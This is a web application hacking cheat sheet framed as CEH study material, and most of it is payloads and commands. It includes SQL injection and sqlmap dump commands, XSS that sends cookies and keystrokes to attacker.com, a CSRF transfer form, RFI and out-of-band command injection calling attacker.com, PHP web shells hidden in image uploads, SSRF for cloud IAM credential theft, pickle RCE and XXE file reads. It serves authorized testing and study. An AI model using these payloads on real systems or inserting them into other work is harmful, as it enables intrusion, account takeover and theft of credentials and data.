# Web Application Hacking (CEH v13 Module 14)

> For authorized security testing, red team exercises, and educational study only.

Quick reference for web application attack vectors, OWASP Top 10, and exploitation techniques.

## Methodology

```
Recon --> Mapping --> Discovery --> Exploitation --> Reporting

1. Recon:        Identify tech stack, frameworks, languages
2. Mapping:      Spider/crawl, sitemap, endpoint enumeration
3. Discovery:    Vulnerability scanning, fuzzing, manual testing
4. Exploitation: Confirm and exploit findings
5. Reporting:    Document impact, evidence, remediation
```

## OWASP Top 10 (2021)

```
A01  Broken Access Control     Horizontal/vertical privilege escalation, IDOR
A02  Cryptographic Failures    Weak ciphers, plaintext storage, missing TLS
A03  Injection                 SQLi, NoSQLi, LDAP, OS command, XSS
A04  Insecure Design           Missing threat modeling, insecure business logic
A05  Security Misconfiguration Default creds, verbose errors, open cloud storage
A06  Vulnerable Components     Outdated libraries, known CVEs, unpatched deps
A07  Auth Failures             Credential stuffing, weak passwords, session fixation
A08  Integrity Failures        Unsigned updates, CI/CD compromise, dependency confusion
A09  Logging Failures          No audit trail, missing alerting, log injection
A10  SSRF                      Internal network access, cloud metadata exfil
```

## SQL Injection

```bash
# Classic auth bypass
' OR 1=1 --
' OR '1'='1' --
admin'--

# Union-based enumeration
' UNION SELECT NULL,NULL,NULL --          # find column count
' UNION SELECT 1,username,password FROM users --

# Error-based extraction (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --

# Blind boolean
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --

# Blind time-based
' AND IF(1=1, SLEEP(5), 0) --

# sqlmap automation
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --level=5 --risk=3
```

## XSS (Cross-Site Scripting)

```html
<!-- Reflected XSS -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>

<!-- Stored XSS (persistent) -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- DOM-based XSS -->
<img src=x onerror="eval(location.hash.slice(1))">

<!-- Cookie stealing -->
<script>
new Image().src="https://attacker.com/log?c="+document.cookie;
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src="https://attacker.com/log?k="+e.key;
};
</script>

<!-- Filter bypass examples -->
<ScRiPt>alert(1)</ScRiPt>                    <!-- mixed case -->
<script>alert(String.fromCharCode(88,83,83))</script>  <!-- char codes -->
<img src=x onerror=alert`1`>                 <!-- template literal -->
<details open ontoggle=alert(1)>             <!-- uncommon event -->
```

## CSRF (Cross-Site Request Forgery)

```html
<!-- Basic forged form submission -->
<form action="https://target.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Image-based GET CSRF -->
<img src="https://target.com/api/delete?id=1337" />

<!-- Anti-CSRF token bypass techniques -->
# 1. Remove token parameter entirely
# 2. Use empty token value
# 3. Use another user's valid token (static tokens)
# 4. Change POST to GET (some apps skip CSRF check on GET)
# 5. Check if token is tied to session or global
```

## IDOR (Insecure Direct Object References)

```bash
# Parameter tampering
GET /api/user/1001      # your account
GET /api/user/1002      # someone else's account

# Common IDOR locations
/api/orders/ORDER-1234
/api/invoices/5678
/download?file_id=999
/profile?user_id=42

# Techniques
# - Increment/decrement numeric IDs
# - Swap UUIDs from other responses
# - Change HTTP method (GET->PUT->DELETE)
# - Check both API and rendered pages
# - Try encoded values (base64, hex)
echo -n "1002" | base64          # test base64 encoded IDs
```

## File Inclusion

```bash
# Local File Inclusion (LFI)
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd        # filter bypass
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd  # URL encoding
?page=php://filter/convert.base64-encode/resource=config.php

# Null byte injection (PHP < 5.3.4)
?page=../../../../etc/passwd%00

# Log poisoning (LFI to RCE)
# 1. Inject PHP into User-Agent via request to target
# 2. Include log file: ?page=/var/log/apache2/access.log

# Remote File Inclusion (RFI)
?page=http://attacker.com/shell.txt
?page=https://attacker.com/shell.php
```

## Command Injection

```bash
# Basic OS command injection
; ls -la
| cat /etc/passwd
& whoami
$(id)
`id`

# Blind command injection (out-of-band)
; curl http://attacker.com/$(whoami)
; ping -c 3 attacker.com
; nslookup $(id | base64).attacker.com

# Filter bypass
;c'a't /etc/passwd         # quote insertion
;c""at /etc/passwd         # empty quotes
;cat${IFS}/etc/passwd      # IFS instead of space
;{cat,/etc/passwd}         # brace expansion
```

## File Upload Vulnerabilities

```bash
# Unrestricted upload — web shell
# Upload shell.php with content: <?php system($_GET['cmd']); ?>
# Access: http://target.com/uploads/shell.php?cmd=id

# Extension bypass
shell.php.jpg              # double extension
shell.php%00.jpg           # null byte
shell.pHp                  # mixed case
shell.php5 / shell.phtml   # alternative extensions

# MIME type bypass
# Set Content-Type: image/jpeg while uploading .php file

# Polyglot file (valid image + PHP)
# Embed PHP in EXIF data:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
mv photo.jpg photo.php.jpg

# Magic byte bypass — prepend valid image header
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

## Directory Traversal

```bash
# Basic traversal
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# Encoding bypass
%2e%2e%2f                  # ../
%252e%252e%252f            # double encoding
..%c0%af                   # overlong UTF-8
..%ef%bc%8f                # fullwidth slash

# Null byte injection
../../../etc/passwd%00.jpg

# Common targets (Linux)
/etc/passwd
/etc/shadow
/home/user/.ssh/id_rsa
/proc/self/environ
/var/log/apache2/access.log

# Common targets (Windows)
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

## SSRF (Server-Side Request Forgery)

```bash
# Internal network scanning
http://127.0.0.1:22
http://192.168.1.1/admin
http://10.0.0.1:8080

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/           # AWS
http://169.254.169.254/metadata/v1/                # DigitalOcean
http://metadata.google.internal/computeMetadata/v1/ # GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure

# AWS IAM credential theft
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Bypass filters
http://0x7f000001/           # hex IP
http://2130706433/           # decimal IP
http://0177.0.0.1/           # octal
http://[::1]/                # IPv6 loopback
http://localtest.me/         # DNS rebinding
http://spoofed.burpcollaborator.net/  # out-of-band
```

## Insecure Deserialization

```python
# Python pickle RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

```java
// Java deserialization — ysoserial
// Generate payload:
// java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
// Send serialized object (look for rO0AB or AC ED 00 05 magic bytes)
```

```php
// PHP object injection
// Vulnerable: unserialize($_GET['data'])
// Craft object with __wakeup() or __destruct() magic methods
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

## XXE (XML External Entity)

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Blind XXE (out-of-band) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- Billion laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

## API Attacks

```bash
# Broken Object Level Authorization (BOLA)
GET /api/v1/users/1001/orders    # authorized
GET /api/v1/users/1002/orders    # unauthorized access attempt

# Mass assignment
POST /api/v1/register
{"username":"test","password":"test","role":"admin","isVerified":true}

# Rate limiting bypass
# Rotate headers:
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

# API enumeration
GET /api/v1/           # check for API docs
GET /swagger.json
GET /openapi.json
GET /api-docs
GET /graphql           # GraphQL introspection

# GraphQL introspection
{"query":"{__schema{types{name,fields{name}}}}"}
```

## Tools

```bash
# Burp Suite — intercepting proxy
# Configure browser proxy -> 127.0.0.1:8080
# Key features: Repeater, Intruder, Scanner, Decoder

# OWASP ZAP — open-source web scanner
zap-cli quick-scan http://target.com
zap-cli active-scan http://target.com

# Nikto — web server scanner
nikto -h http://target.com
nikto -h http://target.com -ssl

# Directory brute-forcing
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt -x php,html,txt
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# Fuzzing
wfuzz -c -z file,/usr/share/wordlists/common.txt --hc 404 http://target.com/FUZZ
wfuzz -c -z file,wordlist.txt -d "user=FUZZ&pass=FUZZ" http://target.com/login

# sqlmap
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -r burp_request.txt --level=5 --risk=3 --batch
```

## Tips

- Always check `robots.txt`, `.git/`, `.env`, `backup.zip`, `web.config` during recon.
- Test for default credentials on admin panels (admin/admin, admin/password).
- Use `Wappalyzer` or `whatweb` to fingerprint tech stacks before attacking.
- Blind injection (SQL, command, XXE) often works when reflected variants are filtered.
- For file upload, test the upload path independently for directory traversal.
- SSRF filters on IP addresses can often be bypassed with DNS rebinding or alternate encodings.
- Check HTTP response headers for security misconfigurations (`X-Frame-Options`, `CSP`, `HSTS`).
- Always capture evidence (screenshots, HTTP requests/responses) for reporting.

## See Also

- `sheets/offensive/sql-injection.md` — deep dive on SQLi techniques
- `sheets/offensive/network-scanning.md` — reconnaissance phase
- `sheets/defensive/waf-rules.md` — understanding WAF bypass

## References

- OWASP Top 10 (2021): https://owasp.org/Top10/
- OWASP Testing Guide v4.2: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTricks: https://book.hacktricks.wiki/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- CEH v13 Module 14 — Hacking Web Applications
